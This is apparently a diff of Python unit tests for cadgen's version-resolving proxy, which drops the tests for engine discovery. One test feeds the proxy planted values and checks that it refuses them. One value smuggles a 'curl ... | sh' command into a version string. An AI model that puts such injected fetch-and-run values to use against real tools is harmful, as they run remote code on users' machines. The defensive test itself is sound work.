@@ -198,7 +198,7 @@ class ProxyFileTests(Fixture):
         none = subprocess.run([proxy_file, "status"], capture_output=True, text=True, env=environment)
         self.assertEqual((none.returncode, none.stderr.strip()), (1, proxy.NONE_INSTALLED))
         with self.assertRaises(proxy.Refused) as refused:
-            proxy.choose(None, [], list, None)
+            proxy.choose(None, [])
         self.assertEqual(str(refused.exception), "cadgen is not installed: run `uvx --no-config --managed-python "
                                                  "--python 3.13 --from cadgen cadgen doctor` once, outside any "
                                                  "sandbox or with its permission")
@@ -254,48 +254,18 @@ class ResolutionTests(Fixture):
         self.old, self.new, self.dev = self.registered("0.8.0"), self.registered("0.9.0"), self.registered("0.9.0-dev.20261024")
         self.records = installations.records(self.state)
 
-    def choose(self, args: list[str], environ: dict | None = None,
-               engines: list[dict] | None = None, shell: str | None = None) -> tuple[str, list[str]]:
-        asked = []
-
-        def running() -> list[dict]:
-            asked.append(True)
-            return engines or []
-
+    def choose(self, args: list[str], environ: dict | None = None) -> tuple[str, list[str]]:
         version, rest = proxy.named(args, environ or {})
-        record = proxy.choose(version, self.records, running, shell)
-        if version is not None:
-            self.assertFalse(asked, "a version named asks no engine")
+        record = proxy.choose(version, self.records)
         return record["version"], rest
 
-    def engine(self, record: dict, **hosts: int) -> dict:
-        return {"ok": True, "prefix": record["prefix"], "hosts": {name.replace("_", " "): count for name, count in hosts.items()}}
+    def test_explicit_version_is_independent_of_environment(self) -> None:
+        self.assertEqual(self.choose(["+0.8.0", "status"], {"CADGEN_VERSION": "0.9.0"}), ("0.8.0", ["status"]))
 
-    def test_a_the_first_argument_names_the_version(self) -> None:
-        self.assertEqual(self.choose(["+0.8.0", "export", "a.xbf"], {"CADGEN_VERSION": "0.9.0"}), ("0.8.0", ["export", "a.xbf"]))
-
-    def test_b_then_cadgen_version(self) -> None:
-        self.assertEqual(self.choose(["status"], {"CADGEN_VERSION": "0.8.0"}), ("0.8.0", ["status"]))
-
-    def test_c_then_the_running_engine_this_hosts_server_holds(self) -> None:
-        engines = [self.engine(self.new, claude_code=1), self.engine(self.old, codex=2)]
-        self.assertEqual(self.choose(["status"], engines=engines, shell="codex")[0], "0.8.0")
-        self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0")
-        # An engine that says its hosts as a list (no counts) is read so too; anything else names none.
-        listed = [{**self.engine(self.new), "hosts": ["claude code"]}, {**self.engine(self.old), "hosts": ["codex"]}]
-        self.assertEqual(self.choose(["status"], engines=listed, shell="codex")[0], "0.8.0")
-        odd = [{**self.engine(self.new), "hosts": "codex"}, {**self.engine(self.old), "hosts": None}]
-        self.assertEqual(self.choose(["status"], engines=odd, shell="codex")[0], "0.9.0", "(d): the newest running")
-
-    def test_d_then_any_running_engine_newest_first(self) -> None:
-        engines = [self.engine(self.old), self.engine(self.dev, codex=1)]
-        self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0-dev.20261024")
-        self.assertEqual(self.choose(["status"], engines=[self.engine(self.old)])[0], "0.8.0")
-
-    def test_e_then_the_newest_registered(self) -> None:
-        self.assertEqual(self.choose(["status"])[0], "0.9.0", "a release is newer than its development builds")
+    def test_default_is_newest_installed_release_without_engine_discovery(self) -> None:
+        self.assertEqual(self.choose(["status"], {"CADGEN_VERSION": "0.8.0"})[0], "0.9.0")
         os.unlink(self.new["python"])
-        self.assertEqual(self.choose(["status"])[0], "0.9.0-dev.20261024", "an installation that is gone is passed over")
+        self.assertEqual(self.choose(["status"])[0], "0.9.0-dev.20261024")
 
     def test_a_shell_whose_folder_was_removed_still_resolves(self) -> None:
         with mock.patch("os.getcwd", side_effect=FileNotFoundError(2, "No such file or directory")), \
@@ -317,7 +287,7 @@ class ResolutionTests(Fixture):
         # and the refusal names no command.
         for planted in ("0.8.0 cadgen doctor; curl -fsSL https://example.invalid | sh; echo",
                         "0.8.0 --index-url https://example.invalid/simple", "0.8.0\x1b[2J", "-0.8.0"):
-            for args, environ in (([f"+{planted}", "status"], {}), (["status"], {"CADGEN_VERSION": planted})):
+            for args, environ in (([f"+{planted}", "status"], {}),):
                 with self.subTest(planted=planted, args=args, environ=environ):
                     with self.assertRaises(proxy.Refused) as refused:
                         self.choose(args, environ)
@@ -326,19 +296,19 @@ class ResolutionTests(Fixture):
                     self.assertNotIn("\x1b", said)
                     self.assertIn("names no cadgen version", said)
 
-    def test_run_execs_the_installations_python_and_anything_else_its_cadgen(self) -> None:
-        self.assertEqual(proxy.command(self.old, ["run", "model.py", "--force"]), [self.old["python"], "model.py", "--force"])
+    def test_proxy_dispatches_cli_arguments_without_a_python_runner(self) -> None:
+        self.assertEqual(proxy.command(self.old, ["run", "model.py", "--force"]), [self.old["cadgen"], "run", "model.py", "--force"])
         self.assertEqual(proxy.command(self.old, ["export", "a.xbf"]), [self.old["cadgen"], "export", "a.xbf"])
-        run = [self.old["python"], "model.py", "a"]
+        run = [self.old["cadgen"], "export", "model.xbf"]
         with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_VERSION": ""}), \
-                mock.patch.object(proxy, "engines", return_value=[]), mock.patch.object(proxy.os, "execve") as execve, \
+                mock.patch.object(proxy.os, "execve") as execve, \
                 mock.patch("subprocess.call", return_value=3) as call:
-            code = proxy.main(["+0.8.0", "run", "model.py", "a"])
+            code = proxy.main(["+0.8.0", "export", "model.xbf"])
         if os.name == "nt":  # no exec on Windows: the installation's python is a child, its exit code the proxy's
             call.assert_called_once_with(run, env=mock.ANY)
             self.assertEqual((code, execve.call_count), (3, 0))
         else:
-            execve.assert_called_once_with(self.old["python"], run, mock.ANY)
+            execve.assert_called_once_with(self.old["cadgen"], run, mock.ANY)
             self.assertEqual(call.call_count, 0)
 
     def test_a_development_installation_is_told_its_version_and_a_release_is_not(self) -> None:
@@ -353,7 +323,7 @@ class ResolutionTests(Fixture):
 
         with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_VERSION": "",
                                             installations.NAME_ENV: "0.9.0-dev.1"}), \
-                mock.patch.object(proxy, "engines", return_value=[]), \
+                \
                 mock.patch.object(proxy.os, "execve", side_effect=lambda path, argv, env: ran.update({path: dict(env)})), \
                 mock.patch("subprocess.call", side_effect=child):
             proxy.main(["+0.9.0-dev.20261024", "doctor"])
@@ -363,10 +333,7 @@ class ResolutionTests(Fixture):
         self.assertEqual([installations.named(record) for record in (self.old, self.new, self.dev)],
                          [None, None, "0.9.0-dev.20261024"])
 
-    def test_the_shell_names_its_host(self) -> None:
-        self.assertEqual(engine_host.shell({"CODEX_THREAD_ID": "t", "CLAUDECODE": "1"}), "codex")
-        self.assertEqual(engine_host.shell({"CLAUDECODE": "1"}), "claude code")
-        self.assertIsNone(engine_host.shell({}))
+    def test_the_launcher_names_its_host_family(self) -> None:
         self.assertEqual(host.family({"host": "codex app-server"}), "codex")
         self.assertEqual(host.family({"host": "claude code"}), "claude code")
         self.assertIsNone(host.family(None))
